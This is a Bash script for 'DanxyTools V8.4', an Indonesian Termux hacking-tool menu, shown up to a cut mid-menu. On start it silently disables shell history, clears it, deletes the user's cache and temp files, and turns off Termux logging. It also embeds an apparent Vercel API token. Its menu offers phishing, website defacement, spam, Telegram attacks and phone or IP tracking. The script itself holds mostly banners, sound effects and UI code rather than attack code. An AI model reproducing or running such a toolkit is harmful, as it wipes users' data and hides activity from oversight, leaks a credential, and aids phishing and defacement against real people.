#!/bin/bash
set +o history
for dir in DanxyTracker DanxyIG DanxyFF DanxyTT DanxySpin DanxyTTSuntik DanxyPro DanxyInject; do
  rm -rf "$HOME/$dir" 2>/dev/null
done
history -c 2>/dev/null
history -w 2>/dev/null
rm -rf ~/.cache/* 2>/dev/null
rm -rf ~/.tmp/* 2>/dev/null
[ ! -f ~/.termux/termux.properties ] && mkdir -p ~/.termux
echo "disable-logging = true" >> ~/.termux/termux.properties 2>/dev/null
set -o history


# Kode warna untuk teks
<<EOF
NC="\033[0m"
BLUE='\033[1;94m'
GREEN='\033[38;5;82m'
RED='\033[38;5;196m'
CYAN='\033[1;96m'
YELLOW='\033[1;93m'
MAGENTA='\033[1;95m'
WHITE='\033[1;97m'
EOF

RED='\e[38;5;196m'
GREEN='\e[38;5;82m'
YELLOW='\e[38;5;226m'
BLUE='\e[38;5;39m'
PURPLE='\e[38;5;201m'
CYAN='\e[38;5;51m'
WHITE='\e[38;5;255m'
ORANGE='\e[38;5;208m'
RESET='\e[0m'

RED='\033[38;5;196m'
GREEN='\033[38;5;40m'
YELLOW='\033[38;5;226m'
BLUE='\033[38;5;21m'
MAGENTA='\033[38;5;165m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'
RESET='\033[0m'

color() {
  local color_code=$1
  local text=$2

  case "$color_code" in
    red)    printf "${RED}%s${NC}\n" "$text" ;;
    green)  printf "${GREEN}%s${NC}\n" "$text" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$text" ;;
    blue)   printf "${BLUE}%s${NC}\n" "$text" ;;
    magenta)printf "${MAGENTA}%s${NC}\n" "$text" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$text" ;;
    white)  printf "${WHITE}%s${NC}\n" "$text" ;;
    *)      printf "%s${NC}\n" "$text" ;; # Default: No color
  esac
}



A() { echo '╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮';}
B() { echo '╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯';}
C() { echo '│'; }

# Kode warna untuk latar belakang
BG_BLUE='\033[1;44m'
BG_GREEN='\033[1;42m'
BG_RED='\033[1;41m'
BG_CYAN='\033[1;46m'
BG_YELLOW='\033[1;43m'
BG_MAGENTA='\033[1;45m'
BG_WHITE='\033[1;47m'

R='\033[1;31m'
G='\033[1;32m'
B='\033[1;34m'
Y='\033[1;33m'
W='\033[1;37m'
D='\033[0;37m'
RESET='\033[0m'

# Kode untuk mengatur gaya teks
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Kode untuk menghapus warna dan gaya
NC='\033[0m'

#WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
YOUTUBE_URL="https://www.youtube.com/@DanxyOfficial"
LAGU_YOUTUBE="https://youtu.be/MunnYFmqWYo" 
LAPOR_TOOLS_ERROR="https://wa.me/6285647260693?text=*LAPOR TOOLS ERROR BANG*"



VERCEL_TOKEN="4nbpNOcDNQtgz57POhZG3TWk"
API="https://api.vercel.com"
# Animasi Loading


loading() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'

    echo -ne "\033[1;36m"   # CYAN
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  Processing..." "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
    done
    printf "            \b\b\b\b\b\b\b\b\b\b\b\b"
    echo -ne "\033[0m"
}

loading() {
trap 'tput cnorm; kill $! 2>/dev/null' EXIT  # restore cursor & kill animasi
tput civis  # sembunyikan cursor

frames=(
'[ ░░░░░░░░░░ ] 0 %  |  INITIALIZING CORE...'
'[ █░░░░░░░░░ ] 10 % |  INJECTING PAYLOAD...'
'[ ██░░░░░░░░ ] 20 % |  BYPASSING FIREWALL...'
'[ ███░░░░░░░ ] 30 % |  CRACKING HASH...'
'[ ████░░░░░░ ] 40 % |  SPREADING ROOTKIT...'
'[ █████░░░░░ ] 50 % |  EXFILTRATING DATA...'
'[ ██████░░░░ ] 60 % |  CLEANING LOGS...'
'[ ███████░░░ ] 70 % |  SPOOFING ORIGIN...'
'[ ████████░░ ] 80 % |  LOCKING BACKDOOR...'
'[ █████████░ ] 90 % |  FINALIZING...'
'[ ██████████ ] DONE |  SYSTEM READY!'
)
total=${#frames[@]}
for ((i=0;i<total;i++)); do
    printf "\r\033[32m%s\033[0m" "${frames[i]}"
    sleep 0.4
done
echo -e "\n"
tput cnorm  # tampilkan cursor lagi
}


command_exists() {
  command -v "$1" >/dev/null 2>&1
}

banner() {
  if command_exists figlet; then
    clear
    toilet -f slant   "     Loading     " --filter border | lolcat -p 0.7
    echo -e "                    ${BG_RED}${YELLOW}SABAR CUY BENTAR DOANG KOK${NC}"
  else
  sleep 2
    clear
    echo -e "${CYAN}===== DanxyTools =====${NC}"
  fi
  #echo -e "${BLUE}"
  #echo "     ╭────────────────────────────────────╮" | lolcat -p 0.7
 # echo "     │    [] LOADING SABAR YHA CUY []   │" | lolcat -p 0.7
 # echo "     ╰────────────────────────────────────╯" | lolcat -p 0.7
  echo -e "${RED}" | lolcat -p 0.7
  sleep 1
  clear
#  loading
  clear
  if command_exists figlet; then
    toilet -f slant "  DanxyTools  " --filter border | lolcat -p 0.7
    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH DANXY OFFICIAL ┃"
    echo -e "      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
   
  else
    echo -e "${CYAN}=====DanxyTools =====${NC}"
 #   loading | lolcat -p 0.7
    sleep 1
  fi
}

Ben() {
echo -e " ${RED}
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}2${RED}     │
│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣏⣀⣀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⢀⡴⢺⡿⠛⠉⡇⠈⡇⠀⠀⠀⠀⠀⠀⢀⡟⠘⡇⠉⠻⣝⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⡞⡟⠀⠀⣠⠇⢠⡇⠀⠀⠀⠀⠀⠀⠈⣷⢀⣳⡀⠀⠘⡎⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ${GREEN}1${RED}       │
│⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡃⣇⣇⣀⡴⣫⢆⡞⠀⠀⠀⣀⣀⣀⡀⠀⠘⣦⠱⣿⢦⣀⣿⡀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}9${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡙⠒⠖⠋⢁⡯⢶⣶⣨⡻⠿⡿⠿⣿⣼⣴⠾⣧⠈⠓⠲⠚⣣⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡣⣄⠀⠨⣯⣿⢟⣷⠹⣿⣾⡾⢻⡿⣿⣿⡿⠃⠀⣤⡾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
│⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⢀⢿⣟⡆⠀⠻⣯⣿⠏⢠⣿⣿⣧⠈⢿⣿⠿⠃⠀⣼⣿⣷⣄⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}                │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}7${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣆⣟⣾⢻⣾⡀⠀⠀⢀⣴⣿⡇⣿⡟⣷⣄⡀⠀⠀⢰⣿⣧⢻⣟⣾⢧⠀⠀⠀⠀⠀⠀${GREEN}7${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ${GREEN}6${RED}           │
│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⢸⠈⢿⣾⣧⣿⣻⣧⠀⠀⡿⣿⢸⣧⣿⡇⣿⢿⡇⠀⠀⣿⣿⢻⣏⣿⡇⢸⡄⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               ${GREEN}0${RED} │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣾⡹⣿⡇⠘⢿⣾⣏⡿⠁⠀⢸⢧⣿⣼⣟⣿⡇⣿⢸⣿⠀⠐⢿⣿⣏⣿⠿⠀⣼⣧⣾⣳⣿⣷⣌⠳⣄⠀⠀⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀              ${GREEN}8${RED}  │
│⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⠻⠙⣿⣷⢹⣿⣦⡀⠀⠁⠀⠀⠀⠈⢿⣇⣿⡿⣿⡇⣿⣿⠟⠀⠀⠀⠀⠀⠀⣀⣾⣿⡟⢸⣿⡟⠹⣿⣷⢹⡆⠀⠀⠀                ${GREEN}0${RED}       │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⢿⡹⣿⣇⢠⠟⣿⢠⣿⣿⣿⣷⣶⣢⣤⡀⠀⠀⠉⠛⠛⠛⠓⠋⠁⠀⠀⢠⣶⣶⣶⣾⣿⢹⣿⡇⢸⡍⢧⠀⣿⡟⣼⠇${GREEN}1${RED}⠀⠀⠀                       │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣜⠿⣾⠟⣡⣾⣿⡿⣿⣇⣿⣟⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣻⡗⣿⣏⣿⡾⣿⡿⢦⠙⣾⡾⢋⡴⠁⠀⠀⠀              ${GREEN}9${RED}          │
│⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⣦⣼⣷⣀⡍⠳⣄⡀⠉⡉⠉⠙⠳⢿⣲⣦⠄⠀⢤⣴⣾⠿⠛⠋⠉⠉⣉⠁⢀⡴⢋⣀⡼⣷⣤⡖⠋⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}1${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⢿⣟⠿⠤⠀⠑⣾⠃⠀⠀⠀⠀⠀⠈⡏⣿⢻⠁⠀⠀⠀⠀⠀⠀⢹⡴⠁⠀⠼⠟⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 │ 
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}8${RED}⠀⠀⠀⠀⠀⣼⠿⠿⣿⢿⣽⣂⣀⡀⠀⠿⣦⡀ ${RED}0${RED}⠀⢆⠀⣇⣿⣼⠀⡄⠀${RED}0${RED}⠀⠀⣠⡿⠇⠀⣀⣀⣾⣿⣿⡿⠻⢿⡄⠀⠀⠀⠀⠀⠀${GREEN}5${RED}⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⣾⡆⣿⢸⣿⣿⣿⣿⣷⣶⣶⣯⣷⣦⣤⣼⣶⣿⣿⣿⣾⣧⣤⣤⣴⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡇⣶⡾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⡵⣿⣿⣿⣿⣿⣿⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⣿⣿⣿⣜⢷⣻⣥⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${GREEN}0${RED}            │
│⠀⠀⠀⠀⠀⠀${GREEN}5${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⣿⡿⣿⣿⣿⢿⣿⣛⣻⡄⠈⠉⠙⠿⣿⣿⢿⣯⡷⣝⢦⣞⡾⣼⣿⢿⣿⣿⠋⠉⡇⠈⣟⢻⣿⣿⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢻⣿⣾⣿⣿⣿⣿⣿⣷⠔⠒⠲⢤⣁⣩⣏⣡⡹⣌⠛⣣⠞⣄⣙⣄⣉⣤⠿⢒⡛⢻⣿⣻⣿⣿⣿⣿⣿⣟⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀                 │
│⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡻⢿⣿⣿⣿⣿⡄⡄⢋⣵⣛⠟⠛⠛⠷⣌⣉⣁⡾⠟⠛⠻⣿⣋⣙⢻⣹⣿⣿⣿⣿⣿⠿⣻⣿⡟⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ${GREEN}0${RED}    │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}6${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡟⣽⣾⣿⣿⣿⣿⣿⠀⣆⠈⣿⣗⡦⢤⡤⠬⣭⠥⠤⡤⢤⣾⣿⡇⢸⠄⢻⣿⣟⣿⣿⣿⣦⡽⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀              ${GREEN}7${RED}  │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠹⣿⣿⣿⣿⣿⣟⣿⢠⣿⣿⣿⣾⣷⣶⣿⣶⣶⣷⣾⣿⣿⣧⢸⣤⣿⣿⣿⣿⣿⡇⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀          ${GREEN}0${RED}      │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⣍⢻⣿⣿⡷⣾⡛⢯⣹⡉⣻⣛⣿⣛⣿⠉⣻⡹⠛⣿⣾⣿⣿⡟⣻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}                │
│⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠛⢇⣿⣙⠂⠚⠛⣉⣀⣀⣀⣨⡛⠓⠐⢚⣽⣹⠛⠛⠿⠮⠿⠁⠀⠀⠀⠀${GREEN}1${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀           ${GREEN}5${RED}     │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}2${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠙⠳⡖⠚⡋⠀⠀⠀⠈⡛⠒⡶⠋⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ${GREEN}2${RED}              │
│⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠙⢦⣀⠀⠀⢀⣠⣴⠞⠁⠀⠘⠃⠀⠀⠀⠀⠀${GREEN}4${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ${GREEN}0${RED}  │
│⠀⠀⠀ ⠀⠀⠀⠀⠀${GREEN}3${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠶⠾⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${GREEN}0${RED}⠀⠀                 │
│         ⠀⠀⠀                       ${RED}[    ${WHITE}${UNDERLINE}${BOLD} DANXY TOOLS V8.4 ${NC}${RED}    ]${RED}                              ${GREEN}7${RED}    │
│           ${GREEN}6${RED}                ${GREEN}0${RED}                                ${GREEN}0${RED}                         ${GREEN}8${RED}          │
│                       ⠀⠀⠀    ${GREEN}8${RED}       ${RED}[   ${WHITE}${BOLD} DARK MENU ${NC}${RED}    ]${RED}          ${GREEN}0${RED}                     ${GREEN}0${RED}       │
│          ${GREEN}0${RED}                ⠀⠀⠀      ${RED}[    ${WHITE}${BOLD} HACKING ONLY ${NC}${RED}    ]${RED}                                  ${GREEN}9${RED}   │
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
   

echo -e "                                                                                                                           "
echo -e "                                                                                                                           "
}
spasi() {
echo "                                                "
echo "                                                "
}
tangal_tahun() {
    local hour=$(date +%H)
    hour=${hour#0}            # <-- tambahkan ini
    local greeting

    if (( hour >= 5 && hour < 12 )); then
        greeting="PAGI KAK"
    elif (( hour >= 12 && hour < 15 )); then
        greeting="SIANG KAK"
    elif (( hour >= 15 && hour < 18 )); then
        greeting="SORE KAK"
    else
        greeting="MALAM KAK"
    fi

    local tgl
    if date --version >/dev/null 2>&1; then
        tgl=$(date '+%A, %d/%B/%Y')
    else
        tgl=$(date '+%A, %d/%B/%Y')
    fi

    tgl=$(sed -E \
      -e 's/Monday/SENIN/g; s/Tuesday/SELASA/g; s/Wednesday/RABU/g' \
      -e 's/Thursday/KAMIS/g; s/Friday/JUM’AT/g; s/Saturday/SABTU/g' \
      -e 's/Sunday/MINGGU/g' \
      -e 's/January/JANUARI/g; s/February/FEBRUARI/g; s/March/MARET/g' \
      -e 's/April/APRIL/g; s/May/MEI/g; s/June/JUNI/g' \
      -e 's/July/JULI/g; s/August/AGUSTUS/g; s/September/SEPTEMBER/g' \
      -e 's/October/OKTOBER/g; s/November/NOVEMBER/g; s/December/DESEMBER/g' \
      <<< "$tgl")
    echo "$greeting, $tgl"
}

# Variabel global untuk kontol sound
SOUND_ENABLED=true

klik() {
    if [ "$SOUND_ENABLED" = true ]; then
        curl -sL https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/klik.mp3 | \
        play -q -t mp3 -
    fi
}
# Fitur untuk mematikan sound
OFF_KLIK() {
    SOUND_ENABLED=false
}

# Fitur untuk menghidupkan sound lagi
ON_KLIK() {
    SOUND_ENABLED=true
}


# letakkan di bagian global (atas) script supaya tersedia untuk semua fungsi
SOUND_SALAH_ENABLED=true

salah() {
  # hanya mainkan sound jika enabled
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    curl -sL https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/pilihanSalah.mp3 | \
    play -q -t mp3 - 2>/dev/null
  fi
}

disableSalah() {
  SOUND_SALAH_ENABLED=false
}

enableSalah() {
  SOUND_SALAH_ENABLED=true
}

toggleSalah() {
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    disableSalah
  else
    enableSalah
  fi
}


hello() {
    # auto-install sox jika belum ada
    if ! command -v play &>/dev/null; then
        echo -e "\033[1;33m[ + ] INSTALL SOX\033[0m"
        pkg install -y sox >/dev/null 2>&1
    fi
    echo -e "${RED}
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│ ██████╗░░█████╗░███╗░░██╗██╗░░██╗██╗░░░██╗ │
│ ██╔══██╗██╔══██╗████╗░██║╚██╗██╔╝╚██╗░██╔╝ │
│ ██║░░██║███████║██╔██╗██║░╚███╔╝░░╚████╔╝░ │
│ ${WHITE}██║░░██║██╔══██║██║╚████║░██╔██╗░░░╚██╔╝░░ │
│ ██████╔╝██║░░██║██║░╚███║██╔╝╚██╗░░░██║░░░ │
│ ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░ │ [ ${RED}V8.4${NC} ]
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    local txt=" HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.4 "
    local delay=0.04
    local len=${#txt}

    # play sound (skip jika gagal)
    curl -sL --max-time 4 \
        https://github.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/raw/refs/heads/main/welcome.mp3 \
        2>/dev/null | play -q -t mp3 - &

    # type-writer effect
    for ((i=0; i<=len; i++)); do
        printf "\r\033[1;93;41m%${i}s\033[0m" "${txt:0:i}"
        sleep "$delay"
    done
    printf "\n"
}



show_menu() {
your_id="$(whoami)"
greeting="$(tangal_tahun)"
# lebar di dalam kedua │ = 49 karakter
g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')

#echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"
echo -e "${GREEN}
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │ █████████░█████████████████████░░████████████████████░█████████ │
 ├─────────────────────────────────────────────────────────────────┤
 │ ${YELLOW}${greeting}${g_spaces}${GREEN}                │
 ├─────────────────────────────────────────────────────────────────┤
 │ ${YELLOW}Your ID: ${your_id}          ${YELLOW}YT${NC}: ${RED}DanxyBot          TT${NC}: Qwela.38${NC}${GREEN}    │
 ╰─────────────────────────────────────────────────────────────────╯${NC}
 ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
 │                     ${YELLOW}~ MENU UTAMA TOOLS V8.4 ~${NC}${GREEN}                   │
 ├────────────┬─────────────────────────┬────────────┬─────────────┤
 │  [  ${RED}01${GREEN}  ]  │ ${YELLOW}SUNTIK TIKTOK${GREEN}           │  PERINTAH  │   FUNGSI    │
 │  [  ${RED}02${GREEN}  ]  │ ${YELLOW}SUNTIK IG    ${GREEN}           ├────────────┴─────────────┤
 │  [  ${RED}03${GREEN}  ]  │ ${YELLOW}CEK PROVIDER NOMOR${GREEN}      │[  DOWNLD ] DOWNLOADER    │
 │  [  ${RED}04${GREEN}  ]  │ ${YELLOW}ASCII ART GENERATOR${GREEN}     │[ PHISING ] PHISING MENU  │
 │  [  ${RED}05${GREEN}  ]  │ ${YELLOW}PERKIRAAN CUACA${GREEN}         │[    A1   ] EFEK KLIK OFF │
 │  [  ${RED}06${GREEN}  ]  │ ${YELLOW}BROWSING (w3m)${GREEN}          │[    A2   ] EFEK KLIK ON  │
 │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │[    B1   ] MATIKAN MUSIK │
 │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │[    B2   ] MUSIK NYALA   │
 │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │[    C1   ] OFF EFEK SALAH│
 │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │[    C2   ] ON EFEK SALAH │
 │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │[   SPAM  ] MENU SPAM     │
 │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │[  SUNTIK ] MENU SUNTIK   │
 │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}ENCRYPS CODE ${GREEN}           │[  MUSIK  ] MUSIK ALBUM   │
 │  [  ${RED}14${GREEN}  ]  │ ${YELLOW}LACAK NAMA${GREEN}              │[  DARK   ] MENU DARK     │
 │  [  ${RED}15${GREEN}  ]  │ ${YELLOW}LACAK LOKASI NOMOR (IP)${GREEN} │[  ATKTG  ] MENU ATTACK TG│
